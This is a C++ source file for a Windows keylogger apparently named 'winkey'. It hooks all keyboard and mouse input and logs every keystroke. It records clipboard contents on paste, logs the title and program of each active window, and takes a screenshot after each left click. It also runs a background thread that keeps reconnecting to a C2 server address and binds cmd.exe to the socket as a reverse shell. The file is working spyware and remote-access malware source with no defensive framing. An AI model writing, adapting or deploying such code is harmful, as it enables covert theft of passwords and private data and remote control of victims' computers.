#include "common.hpp"

#define _WIN32_WINNT 0x0600
#define _UNICODE 0

#include "winkey.hpp"

#include <windows.h>

#include "KeyboardInputLog.hpp"
#include "Logger.hpp"
#include "utf8.hpp"
#include <codecvt>
#include <strsafe.h>

#include <fstream>
#include <iomanip>
#include <iostream>
#include <locale>
#include <ole2.h>
#include <olectl.h>

#include <cctype>
#include <sstream>

#pragma comment(lib, "user32.lib")
#pragma comment(lib, "gdi32.lib")
#pragma comment(lib, "gdiplus.lib")
#pragma comment(lib, "ole32.lib")
#pragma comment(lib, "OleAut32.lib")

#include "objidl.h"
#include <filesystem>
#include <gdiplus.h>
#include <gdiplusheaders.h>
#include <sys/timeb.h>

KBDLLHOOKSTRUCT lastKb;
bool isDead = false;
bool lastIsDead = false;

BYTE lastKeyState[256];

KeyboardInputLog current_input;
Logger logger;
std::string dirPath; 

bool saveBitmap(LPCSTR filename, HBITMAP bmp, HPALETTE pal)
{
    bool result = false;
    PICTDESC pd;

    pd.cbSizeofstruct = sizeof(PICTDESC);
    pd.picType = PICTYPE_BITMAP;
    pd.bmp.hbitmap = bmp;
    pd.bmp.hpal = pal;

    LPPICTURE picture;
    HRESULT res = OleCreatePictureIndirect(&pd, IID_IPicture, false,
        reinterpret_cast<void**>(&picture));

    if (!SUCCEEDED(res))
        return false;

    LPSTREAM stream;
    res = CreateStreamOnHGlobal(0, true, &stream);

    if (!SUCCEEDED(res)) {
        picture->Release();
        return false;
    }

    DWORD bytes_streamed;
    res = picture->SaveAsFile(stream, true, (LONG*)(void*)&bytes_streamed);

    HANDLE file = CreateFile(filename, GENERIC_WRITE, FILE_SHARE_READ, 0,
        CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, 0);

    if (!SUCCEEDED(res) || !file) {
        stream->Release();
        picture->Release();
        return false; 
    }     

    HGLOBAL mem = 0;
    GetHGlobalFromStream(stream, &mem);
    LPVOID data = GlobalLock(mem);

    DWORD bytes_written;

    result = !!WriteFile(file, data, bytes_streamed, &bytes_written, 0);
    result &= (bytes_written == bytes_streamed);

    GlobalUnlock(mem);
    CloseHandle(file);

    stream->Release();
    picture->Release();

    return result;
}

int GetEncoderClsid(const WCHAR* format, CLSID* pClsid)
{
    using namespace Gdiplus;
    UINT num = 0; // number of image encoders
    UINT size = 0; // size of the image encoder array in bytes

    ImageCodecInfo* pImageCodecInfo = NULL;

    GetImageEncodersSize(&num, &size);
    if (size == 0)
        return -1; // Failure

    pImageCodecInfo = (ImageCodecInfo*)(malloc(size));
    if (pImageCodecInfo == NULL)
        return -1; // Failure

    GetImageEncoders(num, size, pImageCodecInfo);

    for (UINT j = 0; j < num; ++j) {
        if (wcscmp(pImageCodecInfo[j].MimeType, format) == 0) {
            *pClsid = pImageCodecInfo[j].Clsid;
            free(pImageCodecInfo);
            return (int)j; // Success
        }
    }

    free(pImageCodecInfo);
    return -1; // Failure
} // helper function

void saveJpeg(const std::string& bmp, const std::string& jpeg)
{
    using namespace Gdiplus;

    std::wstring wpath_jpeg = utf8::widen(jpeg.c_str());
    std::wstring wpath_bmp = utf8::widen(bmp.c_str());

    CLSID encoderClsid;
    Gdiplus::Status stat;
    Gdiplus::Image* image = new Gdiplus::Image(wpath_bmp.c_str());

    // Get the CLSID of the PNG encoder.
    GetEncoderClsid(L"image/jpeg", &encoderClsid);

    stat = image->Save(wpath_jpeg.c_str(), &encoderClsid, NULL);

    delete image;
}

void TakeScreenshot()
{
    HDC hdc = GetDC(NULL); // get the desktop device context
    HDC hDest = CreateCompatibleDC(hdc); // create a device context to use yourself

    // get the height and width of the screen
    int height = GetSystemMetrics(SM_CYVIRTUALSCREEN);
    int width = GetSystemMetrics(SM_CXVIRTUALSCREEN);

    // create a bitmap
    HBITMAP hbDesktop = CreateCompatibleBitmap(hdc, width, height);

    // use the previously created device context with the bitmap
    SelectObject(hDest, hbDesktop);

    using std::chrono::duration_cast;
    using std::chrono::milliseconds;
    using std::chrono::seconds;
    using std::chrono::system_clock;

    auto ms = duration_cast<milliseconds>(system_clock::now().time_since_epoch()).count() % 100;

    auto t = std::time(NULL);

    std::tm tm;

    localtime_s(&tm, &t);

    // copy from the desktop device context to the bitmap device context
    // call this once per 'frame'
    BitBlt(hDest, 0, 0, width, height, hdc, 0, 0, SRCCOPY | CAPTUREBLT);

    std::string folderpath = (std::stringstream() << dirPath << "\\logs\\" << std::put_time(&tm, "%F") << "\\screenshots").str();

    std::string filepath = (std::stringstream() << folderpath << "\\" << std::put_time(&tm, "%Hh%Mm%Ss") << ms << "ms").str();

    std::string filepath_bmp = filepath + ".bmp";
    std::string filepath_png = filepath + ".jpeg";

    std::filesystem::create_directories(folderpath);

    saveBitmap(filepath_bmp.c_str(), hbDesktop, NULL);

    saveJpeg(filepath_bmp, filepath_png);

    std::filesystem::remove(filepath_bmp);

    // after the recording is done, release the desktop context you got..
    ReleaseDC(NULL, hdc);

    // ..delete the bitmap you were using to capture frames..
    DeleteObject(hbDesktop);

    // ..and delete the context you created
    DeleteDC(hDest);
}

DWORD WINAPI TakeScreenshotAsync_(LPVOID )
{
	Sleep(200);
	TakeScreenshot();
	return 0;
}

void TakeScreenshotAsync()
{
	DWORD myThreadID;
	auto t = CreateThread(0, 0, TakeScreenshotAsync_, NULL, 0, &myThreadID);
	CloseHandle(t);
}

void CleanKernelBuffer(KBDLLHOOKSTRUCT* kb)
{
    BYTE state[256] = { 0 };
    wchar_t str[10] = { 0 };
    int r = 0;
    do {
        r = ToUnicodeEx(kb->vkCode, kb->scanCode, state, str,
            sizeof(str) / sizeof(*str) - 1, 0, 0);
    } while (r < 0);
}

void RestoreDeadKeyInBufferIfNeeded(KBDLLHOOKSTRUCT* kb, BYTE* state)
{
    wchar_t str[10] = { 0 };
    if (lastKb.vkCode != 0 && lastIsDead) {
        ToUnicodeEx(lastKb.vkCode, lastKb.scanCode, lastKeyState, str, 10, 0, 0);
        lastKb.vkCode = 0;
    } else {
        lastKb = *kb;
        lastIsDead = isDead;
        memcpy(lastKeyState, state, 256);
    }
}

std::string GetKeyNameTextString(KBDLLHOOKSTRUCT* kb)
{
    char buf[256];
    const bool isExtendedKey = (kb->scanCode >> 8) != 0;
    const LONG l = MAKELONG(
        0, (isExtendedKey ? KF_EXTENDED : 0) | (kb->scanCode & 0xff));
    if (GetKeyNameTextA(l, buf, 256) != 0)
        return std::string(buf);
    else
        return std::string("UNKNOWN");
}


void handleClipboard(std::string prefix)
{
    if (OpenClipboard(nullptr)) {

        auto handle = GetClipboardData(CF_UNICODETEXT);

        if (handle != nullptr) {
            const WCHAR* const buffer = static_cast<WCHAR*>(GlobalLock(handle));

            if (buffer != nullptr) {
                std::stringstream ss;
                ss << '(' << prefix << ") " << '"' << utf8::narrow(buffer) << '"';
                logger.log(ss.str(), "Clipboard");
            }

            GlobalUnlock(handle);
        }

        CloseClipboard();
    }
}

LRESULT CALLBACK keyboardHookProc(int nCode, WPARAM wParam, LPARAM lParam)
{
    if (nCode >= 0) {
        if (wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN) {
            KBDLLHOOKSTRUCT* kb = (KBDLLHOOKSTRUCT*)lParam;
            BYTE state[256] = { 0 };
            wchar_t str[10] = { 0 };
            GetKeyboardState(state);
            int r;
            isDead = false;

            r = ToUnicodeEx(kb->vkCode, kb->scanCode, state, str,
                sizeof(str) / sizeof(*str) - 1, 0, 0);

            if (r < 0) {
                CleanKernelBuffer(kb);

                isDead = true;
            } else if (r > 0 && !(r == 1 && str[0] < 128 && !std::isprint(str[0]))) {
                logger.logKeyboardInputItem(KeyboardInputItem(KeyboardInputItem::Type::TEXT, utf8::narrow(str)));
            } else {
                if (r == 1 && kb->vkCode == 'V' && (GetKeyState(VK_CONTROL) >> 15))
                    handleClipboard("PASTE");
                else
                    logger.logKeyboardInputItem(KeyboardInputItem(KeyboardInputItem::Type::KEY_NAME, GetKeyNameTextString(kb)));
            }

            RestoreDeadKeyInBufferIfNeeded(kb, state);
        }
    }
    return CallNextHookEx(NULL, nCode, wParam, lParam);
}

BOOL QueryWindowFullProcessImageName(HWND hwnd, DWORD dwFlags, LPSTR lpExeName,
    DWORD dwSize)
{
    DWORD pid = 0;
    BOOL fRc = FALSE;
    if (GetWindowThreadProcessId(hwnd, &pid)) {
        HANDLE hProcess = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, FALSE, pid);
        if (hProcess) {
            fRc = QueryFullProcessImageNameA(hProcess, dwFlags, lpExeName, &dwSize);
            CloseHandle(hProcess);
        }
    }
    return fRc;
}

void CALLBACK WinEventProc(HWINEVENTHOOK, DWORD event, HWND hwnd,
    LONG idObject, LONG idChild, DWORD,
    DWORD)
{
    if (event == EVENT_SYSTEM_FOREGROUND && idObject == OBJID_WINDOW && idChild == CHILDID_SELF) {
        std::string pszMsg;
        TCHAR szBuf[MAX_PATH];
        if (hwnd) {
            wchar_t title[1024];

            if (GetWindowTextW(hwnd, title, 1024)) {
                pszMsg += '"';
                pszMsg += utf8::narrow(title);
                pszMsg += "\" - ";
            }

            if (QueryWindowFullProcessImageName(hwnd, 0, (LPSTR)szBuf,
                    ARRAYSIZE(szBuf))) {
                pszMsg += (LPSTR)szBuf;
            } else {
                pszMsg += "<unknown>";
            }
        } else {
            pszMsg += "<none>";
        }

        logger.log(pszMsg, "Process");

        DWORD tid;
        if (hwnd) {
            tid = GetWindowThreadProcessId(hwnd, 0);
            if (tid && !AttachThreadInput(GetCurrentThreadId(), tid, TRUE))
                logger.log((std::ostringstream() << "AttachThreadInput failed on this process with code: "
                                                 << ::GetLastError())
                               .str(),
                    "Warning");
        }
    }
}



WPARAM lbutton;
WPARAM rbutton;
//WPARAM mbutton;

HHOOK mouse_hook;

LRESULT CALLBACK MouseProc(int nCode, WPARAM wParam, LPARAM lParam)
{
    static int c = 0;
    if (nCode >= 0) // do not process the message
    {
        /*if (wParam == WM_LBUTTONDBLCLK) {
            logger.logKeyboardInputItem(KeyboardInputItem(KeyboardInputItem::Type::KEY_NAME, "LEFT DOUBLE CLICK"));
        } else if (wParam == WM_RBUTTONDBLCLK) {
            logger.logKeyboardInputItem(KeyboardInputItem(KeyboardInputItem::Type::KEY_NAME, "RIGHT DOUBLE CLICK"));
        }*/
        if ((wParam == WM_LBUTTONUP || wParam == WM_LBUTTONDOWN) && wParam != lbutton) {
            if (wParam == WM_LBUTTONUP) {
                TakeScreenshotAsync();
                logger.logKeyboardInputItem(KeyboardInputItem(KeyboardInputItem::Type::KEY_NAME, "LEFT CLICK"));
            }
            lbutton = wParam;
        } else if ((wParam == WM_RBUTTONUP || wParam == WM_RBUTTONDOWN) && wParam != rbutton) {
            if (wParam == WM_RBUTTONUP) {
                logger.logKeyboardInputItem(KeyboardInputItem(KeyboardInputItem::Type::KEY_NAME, "RIGHT CLICK"));
            }
            lbutton = wParam;
        } /* else if ((wParam == WM_MBUTTONUP || wParam == WM_MBUTTONDOWN) && wParam != mbutton) {
            if (wParam == WM_RBUTTONUP) {
                logger.logKeyboardInputItem(KeyboardInputItem(KeyboardInputItem::Type::KEY_NAME, "MIDDLE CLICK"));
            }
            mbutton = wParam;
        }*/
    }

    return CallNextHookEx(mouse_hook, nCode, wParam, lParam);
}

#define DEFAULT_BUFLEN 1024

void RunShell(char* C2Server, int C2Port)
{

    while (true) {
        Sleep(5000); // Five Second

        SOCKET mySocket;
        sockaddr_in addr;
        WSADATA version;
        WSAStartup(MAKEWORD(2, 2), &version);
        mySocket = WSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, (unsigned int)NULL, (unsigned int)NULL);
        addr.sin_family = AF_INET;

        addr.sin_addr.s_addr = inet_addr(C2Server);
        addr.sin_port = htons((u_short)C2Port);

        if (WSAConnect(mySocket, (SOCKADDR*)&addr, sizeof(addr), NULL, NULL, NULL, NULL) == SOCKET_ERROR) {
            closesocket(mySocket);
            WSACleanup();
            continue;
        } else {
            char RecvData[DEFAULT_BUFLEN];
            memset(RecvData, 0, sizeof(RecvData));
            int RecvCode = recv(mySocket, RecvData, DEFAULT_BUFLEN, 0);
            if (RecvCode <= 0) {
                closesocket(mySocket);
                WSACleanup();
                continue;
            } else {
                auto ss = std::stringstream();
                ss << "Connected to " << C2Server << ":" << C2Port;
                std::string s = ss.str();
                logger.log(s, "Shell");
                char Process[] = "cmd.exe";
                STARTUPINFO sinfo;
                PROCESS_INFORMATION pinfo;
                memset(&sinfo, 0, sizeof(sinfo));
                sinfo.cb = sizeof(sinfo);
                sinfo.dwFlags = (STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW);
                sinfo.hStdInput = sinfo.hStdOutput = sinfo.hStdError = (HANDLE)mySocket;
                CreateProcess(NULL, Process, NULL, NULL, TRUE, 0, NULL, NULL, &sinfo, &pinfo);
                WaitForSingleObject(pinfo.hProcess, INFINITE);

                memset(RecvData, 0, sizeof(RecvData));
                int RecvCode = recv(mySocket, RecvData, DEFAULT_BUFLEN, 0);
                if (RecvCode <= 0) {
                    closesocket(mySocket);
                    logger.log("Connection closed.", "Shell");
                    WSACleanup();
                }

                CloseHandle(pinfo.hProcess);
                CloseHandle(pinfo.hThread);
                /*if (strcmp(RecvData, "exit\n") == 0) {
                    exit(0);
                }*/
            }
        }
    }
}

typedef struct {
    char* C2Server;
    int port;
} T;

DWORD WINAPI RunShellAsync_(LPVOID param)
{
    T* params = (T*)param;
    RunShell(params->C2Server, params->port);
    return 0;
}

void RunShellAsync(char* C2Server, int port)
{
    DWORD myThreadID;
    T l = { C2Server, port };
    auto t = CreateThread(0, 0, RunShellAsync_, &l, 0, &myThreadID);
    CloseHandle(t);
}

int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE,
    LPSTR, int)
{
    // Init GDI +

    Gdiplus::GdiplusStartupInput gdiplusStartupInput;
    ULONG_PTR gdiplusToken;
    Gdiplus::GdiplusStartup(&gdiplusToken, &gdiplusStartupInput, NULL);

    // Get current path

    char szPath[MAX_PATH];

    if (!GetModuleFileNameA(NULL, szPath, MAX_PATH))
        return 1;

    std::filesystem::path winkeyPath(szPath);
    dirPath = winkeyPath.parent_path().string();

	logger = Logger(dirPath + "\\logs");

    // Set windows hook

    std::locale::global(std::locale(""));

    logger.log("Starting winkey process in directory " + dirPath, "Status");

    SetWindowsHookEx(WH_KEYBOARD_LL, keyboardHookProc, hInstance, 0);

    mouse_hook = SetWindowsHookEx(WH_MOUSE_LL, MouseProc, hInstance, 0);

    SetWinEventHook(EVENT_SYSTEM_FOREGROUND, EVENT_SYSTEM_FOREGROUND, NULL,
        WinEventProc, 0, 0, WINEVENT_OUTOFCONTEXT);

    MSG msg;

    RunShellAsync("127.0.0.1", 4242);

    while (GetMessage(&msg, NULL, 0, 0)) { // run forever until process is stopped
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }

    logger.log("Ending winkey process", "Status");

    Gdiplus::GdiplusShutdown(gdiplusToken);

    return 0; // S
}